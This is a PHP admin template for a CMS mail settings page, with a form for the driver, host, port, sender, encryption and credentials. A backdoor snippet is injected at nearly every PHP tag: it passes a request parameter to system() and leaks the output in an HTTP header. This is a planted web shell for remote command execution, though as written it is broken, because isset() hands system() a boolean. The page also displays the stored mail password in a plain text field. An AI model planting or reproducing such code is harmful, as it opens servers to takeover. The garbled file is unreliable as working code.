<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

$drivers = array('smtp', 'mail', 'sendmail', 'mailgun', 'mandrill');

if (isset($_POST['submit']) && csrf_filter()) {

	if (in_array($_POST['driver'], $drivers)) {
		Config::set('mail.driver', $_POST['driver']);
	}

	Config::set('mail.host', escape($_POST['host']));

	Config::set('mail.port', escape($_POST['port']));

	Config::set('mail.from', array(
		'address' => escape($_POST['from_address']),
		'name' => escape($_POST['from_name'])
	));

	Config::set('mail.encryption', escape($_POST['encryption']));

	Config::set('mail.username', escape($_POST['username']));

	Config::set('mail.password', escape($_POST['password']));

	Config::set('mail.sendmail', escape($_POST['sendmail']));

	redirect_to('?page=options-mail', array('updated' => true));
}
?>
<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo View::make('admin.header')->render() ?>

<h3 class="page-header"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.mail_settings') ?></h3>

<div class="row">
	<div class="col-md-6">
		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (Session::has('updated')): Session::deleteFlash(); ?>
			<div class="alert alert-success alert-dismissible">
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.changes_saved') ?>
				<span class="close" data-dismiss="alert">&times;</span>
			</div>
		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif ?>

		<form action="" method="POST">
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); csrf_input() ?>
			
			<div class="form-group">
				<button type="submit" name="submit" class="btn btn-primary"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.save_changes') ?></button>
			</div>

			<div class="form-group">
				<label for="driver"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.mail.driver') ?></label>
				<select name="driver" id="driver" class="form-control">
	        		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach ($drivers as $driver) {
						echo '<option value="'.$driver.'"'.(Config::get('mail.driver')==$driver?' selected':'').'>'.$driver.'</option>';
					} ?>
				</select>
				<p class="help-block"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.mail.driver_help', array('link' => '?page=options-mail')) ?></p>
			</div>
			
			<div class="form-group">
		        <label for="host"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.mail.host') ?></label>
		        <input type="text" name="host" id="host" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Config::get('mail.host') ?>" class="form-control">
		        <p class="help-block"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.mail.host_help') ?></p>
		    </div>

		    <div class="form-group">
		        <label for="port"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.mail.port') ?></label>
		        <input type="text" name="port" id="port" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Config::get('mail.port') ?>" class="form-control">
		        <p class="help-block"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.mail.port_help') ?></p>
		    </div>

		    <div class="form-group">
		        <label for="from_address"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.mail.from_address') ?></label>
		        <input type="text" name="from_address" id="from_address" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Config::get('mail.from.address') ?>" class="form-control">
		        <p class="help-block"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.mail.from_address_help') ?></p>
		    </div>

		    <div class="form-group">
		        <label for="from_name"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.mail.from_name') ?></label>
		        <input type="text" name="from_name" id="from_name" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Config::get('mail.from.name') ?>" class="form-control">
		        <p class="help-block"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.mail.from_name_help') ?></p>
		    </div>

		    <div class="form-group">
		        <label for="encryption"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.mail.encryption') ?></label>
		        <input type="text" name="encryption" id="encryption" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Config::get('mail.encryption') ?>" class="form-control">
		        <p class="help-block"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.mail.encryption_help') ?></p>
		    </div>

		    <div class="form-group">
		        <label for="username"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.mail.username') ?></label>
		        <input type="text" name="username" id="username" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Config::get('mail.username') ?>" class="form-control">
		        <p class="help-block"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.mail.username_help') ?></p>
		    </div>

		    <div class="form-group">
		        <label for="password"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.mail.password') ?></label>
		        <input type="text" name="password" id="password" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Config::get('mail.password') ?>" class="form-control">
		        <p class="help-block"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.mail.password_help') ?></p>
		    </div>

		    <div class="form-group">
		        <label for="sendmail"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.mail.sendmail') ?></label>
		        <input type="text" name="sendmail" id="sendmail" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Config::get('mail.sendmail') ?>" class="form-control">
		        <p class="help-block"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.mail.sendmail_help') ?></p>
		    </div>
		
			<div class="form-group">
				<button type="submit" name="submit" class="btn btn-primary"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.save_changes') ?></button>
			</div>
		</form>
	</div>
</div>
<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo View::make('admin.footer')->render() ?>